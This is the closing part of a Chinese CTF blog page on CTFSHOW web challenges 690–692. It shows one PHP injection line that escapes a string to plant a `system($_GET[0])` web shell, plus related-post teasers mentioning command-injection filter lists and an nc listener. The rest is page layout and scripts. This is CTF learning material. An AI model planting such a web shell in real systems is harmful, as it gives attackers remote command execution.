+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;\\&#x27;</span>;<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">0</span>]);<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://120.46.180.209">ZEPHeyrr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://120.46.180.209/2026/11/15/dasaiyuanti3/">http://120.46.180.209/2026/11/15/dasaiyuanti3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://120.46.180.209" target="_blank">西风的那一年</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/ctfshow%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/">ctfshow大赛原题</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/11/15/sear/" title="【论文阅读】【MM 25'】SEAR：精准定制你的画像，骗人更容易"><img class="cover" src="/2026/11/15/sear/QQ20261115-161622.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">【论文阅读】【MM 25'】SEAR：精准定制你的画像，骗人更容易</div></div><div class="info-2"><div class="info-item-1">当 AR 眼镜替骗子做足了功课：它看见你的脸、听见你的语气、翻完你的朋友圈，再用大模型写出一段“刚刚好”的开场白——93.3% 的人点开了它发来的链接。 论文信息： 标题：SEAR: A Multimodal Dataset for Analyzing AR-LLM-Driven Social Engineering Behaviors（一个用于分析 AR-LLM 驱动社交工程行为的多模态数据集）  发表：ACM MM 2025（第 33 届 ACM 国际多媒体会议），2025 年 10 月 27–31 日，爱尔兰都柏林；DOI：10.1145&#x2F;3746027.3758245。ACM MM（ACM International Conference on Multimedia）是 ACM 旗下面向多媒体领域的顶级会议，也是中国计算机学会（CCF）推荐的 A 类会议，与 CVPR、ICCV、NeurIPS 等并列为多媒体与视觉方向最重要的发表场所之一；议题覆盖多模态理解、生成、检索、人机交互与多媒体安全，近年来对“多模态大模型 +...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/10/24/ctfshow-dasaiyuanti/" title="【CTFSHOW】 web入门大赛原题一（WEB680-686）"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-24</div><div class="info-item-2">【CTFSHOW】 web入门大赛原题一（WEB680-686）</div></div><div class="info-2"><div class="info-item-1">WEB-680题目网页很简单，仅一句“Post code to...</div></div></div></a><a class="pagination-related" href="/2026/10/24/ctfshow-dasaiyuanti1/" title="【CTFSHOW】 web入门大赛原题二（WEB687-）"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-24</div><div class="info-item-2">【CTFSHOW】 web入门大赛原题二（WEB687-）</div></div><div class="info-2"><div class="info-item-1">WEB-68712345678910111213141516171819&lt;?php    highlight_file(__FILE__);    $target = $_REQUEST[ &#x27;ip&#x27; ];    $target=trim($target);    $substitutions = array(        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,        &#x27;;&#x27; =&gt; &#x27;&#x27;,        &#x27;|&#x27; =&gt; &#x27;&#x27;,        &#x27;-&#x27;  =&gt; &#x27;&#x27;,        &#x27;$&#x27;  =&gt; &#x27;&#x27;,        &#x27;(&#x27;  =&gt; &#x27;&#x27;,        &#x27;)&#x27;  =&gt; &#x27;&#x27;,        &#x27;`&#x27;  =&gt;...</div></div></div></a><a class="pagination-related" href="/2023/07/24/Socnet/" title="【打靶】Socnet"><img class="cover" src="/2023/07/24/Socnet/cover.PNG" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="info-item-2">【打靶】Socnet</div></div><div class="info-2"><div class="info-item-1">靶机下载地址：https://download.vulnhub.com/boredhackerblog/medium_socnet.ova 主机探测arp-scan -l  nmap -sn 192.168.40.0/16  kali：192.168.40.148 靶机：192.168.40.149 开始时没能使用工具扫描到靶机ip，最后才发现是因为VMware默认采用了桥接模式而非ＮＡＴ模式将其接入网络。 进一步信息收集1.端口、服务、操作系统探测nmap -sV -sC -O 192.168.40.149  目标开放了22、5000端口，在5000端口运行了一个由python2编写的http服务“Werkzeug”。在按照提示输入少于4字符长度的信息时会提示输入不够长  2.目录扫描dirsearch -u 192.168.40.149：5000 对5000端口进行目录扫描，发现一个／admin目录，访问，内有一个可执行python代码的入口。 尝试利用1.利用python来反弹shell先在kali监听5555端口： nc -lvnp...</div></div></div></a><a class="pagination-related" href="/2023/08/02/admx-new/" title="【打靶】AdmX_new"><img class="cover" src="/2023/08/02/admx-new/cover1.PNG" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-02</div><div class="info-item-2">【打靶】AdmX_new</div></div><div class="info-2"><div class="info-item-1">靶机地址：https://download.vulnhub.com/admx/AdmX_new.7z 信息搜集及主机发现主机发现nmap -sn 192.168.40.0/24 netdiscover -r 192.168.40.0/24 这里再记录一工具arping，相较于arp-scan它范围更广，配合简单的bash使用。 for i in $(seq 1 256);do sudo arping -c 1 192.168.40.$i;done  kali:192.168.40.148 靶机：192.168.40.150 信息搜集靶机端口、服务、操作系统探测nmap -sV -p- -O 192.168.40.150 主机只开放了80端口，访问后为apache的默认配置界面。   目录爆破dirsearch -u 192.168.40.150:80 80端口下存在&#x2F;wordpress...</div></div></div></a><a class="pagination-related" href="/2025/06/03/ctf-blackbox/" title="【CTFSHOW】 web入门-黑盒测试"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-03</div><div class="info-item-2">【CTFSHOW】 web入门-黑盒测试</div></div><div class="info-2"><div class="info-item-1">web380 扫描目录后，存在page.php 这里存在一个id.php参数，可能是文件包含。get传入id&#x3D;flag即可 web381 原来的page.php加入了一个包含文件的前缀。  在注释中存在一个不存在于常见目录名称的目录，访问之即可 web382访问上题的目录，发现一个登录界面。  简单注入即可 web383同382...</div></div></div></a><a class="pagination-related" href="/2024/07/22/ctf-file-upload/" title="【CTFSHOW】 web入门文件上传"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-22</div><div class="info-item-2">【CTFSHOW】 web入门文件上传</div></div><div class="info-2"><div class="info-item-1">web151前端验证文件格式，抓包改包。  web152说是后端提供了校验，但是抓包改包也可。 web153.user.ini实际上就是一个可以由用户“自定义”的php.ini 在其中添加如下选项可以包含一些文件： 1auto_prepend_file=01.png  若该目录下存在合法的php文档则会自动包含这个gif文件。恰好，本地是黑名单过滤。 首先通过前两题同样的方法将.user.ini文件上传，再直接上传改了后缀名的🐎。 web154黑名单过滤了上传文件中不能有php，但是大小写可以绕过，其他同上。 web155黑名单过滤，不区分大小写，但是可以用短标签   web156在之前的基础上过滤了中括号[] 用大括号代替之。 web157 158过滤了{} []&#x3D; 直接写命令 123&lt;?     system(&quot;nl ../fl*&quot;)?&gt;                  web159过滤了system...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZEPHeyrr</div><div class="author-info-description">我想事情是它本来该有的样子</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zepheyrr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是一个技术博客，用于自身学习记录。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-690%EF%BC%88%E6%9A%82%E6%97%A0%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">WEB-690（暂无）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E9%9D%A2%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">题面：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-691"><span class="toc-number">2.</span> <span class="toc-text">WEB-691</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E9%9D%A2%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">题面：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">解析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-692"><span class="toc-number">3.</span> <span class="toc-text">WEB-692</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">解析</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/11/15/dasaiyuanti3/" title="【CTFSHOW】 web入门大赛原题一（WEB690-）"><img src="/img/ctf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门大赛原题一（WEB690-）"/></a><div class="content"><a class="title" href="/2026/11/15/dasaiyuanti3/" title="【CTFSHOW】 web入门大赛原题一（WEB690-）">【CTFSHOW】 web入门大赛原题一（WEB690-）</a><time datetime="2026-11-15T10:40:44.000Z" title="发表于 2026-11-15 18:40:44">2026-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/15/sear/" title="【论文阅读】【MM 25'】SEAR：精准定制你的画像，骗人更容易"><img src="/2026/11/15/sear/QQ20261115-161622.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【论文阅读】【MM 25'】SEAR：精准定制你的画像，骗人更容易"/></a><div class="content"><a class="title" href="/2026/11/15/sear/" title="【论文阅读】【MM 25'】SEAR：精准定制你的画像，骗人更容易">【论文阅读】【MM 25'】SEAR：精准定制你的画像，骗人更容易</a><time datetime="2026-11-15T08:13:32.000Z" title="发表于 2026-11-15 16:13:32">2026-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/15/sign/" title="【论文阅读】【CCS 25'】SigN：因为它慢，所以它是假的"><img src="/2026/11/15/sign/QQ20261115-151450.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【论文阅读】【CCS 25'】SigN：因为它慢，所以它是假的"/></a><div class="content"><a class="title" href="/2026/11/15/sign/" title="【论文阅读】【CCS 25'】SigN：因为它慢，所以它是假的">【论文阅读】【CCS 25'】SigN：因为它慢，所以它是假的</a><time datetime="2026-11-15T03:13:32.000Z" title="发表于 2026-11-15 11:13:32">2026-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/14/pei/" title="【论文阅读】【NDSS 27'】ESPInspector：你的邮箱归我了,伪造SMTP故障现场，把删邮件包装成修复邮箱故障的必要步骤”"><img src="/2026/11/14/pei/QQ20261114-214508.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【论文阅读】【NDSS 27'】ESPInspector：你的邮箱归我了,伪造SMTP故障现场，把删邮件包装成修复邮箱故障的必要步骤”"/></a><div class="content"><a class="title" href="/2026/11/14/pei/" title="【论文阅读】【NDSS 27'】ESPInspector：你的邮箱归我了,伪造SMTP故障现场，把删邮件包装成修复邮箱故障的必要步骤”">【论文阅读】【NDSS 27'】ESPInspector：你的邮箱归我了,伪造SMTP故障现场，把删邮件包装成修复邮箱故障的必要步骤”</a><time datetime="2026-11-14T04:11:32.000Z" title="发表于 2026-11-14 12:11:32">2026-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/11/foren2/" title="【CTFSHOW】 电子取证——JiaJia—PC1~3"><img src="/img/ctf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 电子取证——JiaJia—PC1~3"/></a><div class="content"><a class="title" href="/2026/11/11/foren2/" title="【CTFSHOW】 电子取证——JiaJia—PC1~3">【CTFSHOW】 电子取证——JiaJia—PC1~3</a><time datetime="2026-11-11T03:40:44.000Z" title="发表于 2026-11-11 11:40:44">2026-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2026 By ZEPHeyrr</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a><br>
+<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">蜀ICP备2023008535号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><script src="/js/feet.js"></script><script src="/js/snow.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="https://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax src="https://unpkg.com/oh-my-live2d"></script><script>const oml2d = OML2D.loadOml2d({dockedPosition:"right",mobileDisplay:true,models:[{"path":"https://unpkg.com/live2d-widget-model-shizuku@1.0.5/assets/shizuku.model.json","mobilePosition":[-10,23],"mobileScale":0.1,"mobileStageStyle":{"width":180,"height":166},"motionPreloadStrategy":"IDLE","position":[-10,35],"scale":0.15,"stageStyle":{"width":250,"height":250}},{"path":"https://unpkg.com/live2d-widget-model-koharu@1.0.5/assets/koharu.model.json","scale":0.12,"position":[0,0],"stageStyle":{"width":250},"mobileScale":0.08,"mobilePosition":[0,0],"mobileStageStyle":{"width":180}},{"path":"https://unpkg.com/live2d-widget-model-haruto@1.0.5/assets/haruto.model.json","scale":0.12,"position":[0,0],"mobileScale":0.08,"mobilePosition":[0,0],"mobileStageStyle":{"width":180},"stageStyle":{"width":250}}],parentElement:document.body,primaryColor:"var(--btn-bg)",sayHello:false,tips:{style: {"width":230,"height":120,"left":"calc(50% - 20px)","top":"-100px"},mobileStyle: {"width":180,"height":80,"left":"calc(50% - 30px)","top":"-100px"},idleTips:{interval:15000,message:function(){
+  return axios.get('https://v1.hitokoto.cn?c=i')
+    .then(function (response) {
+      return response.data.hitokoto ;
+    })
+    .catch(function (error) {
+      console.error(error);
+    });
+}
+}}});</script><!-- hexo injector body_end end --></body></html>
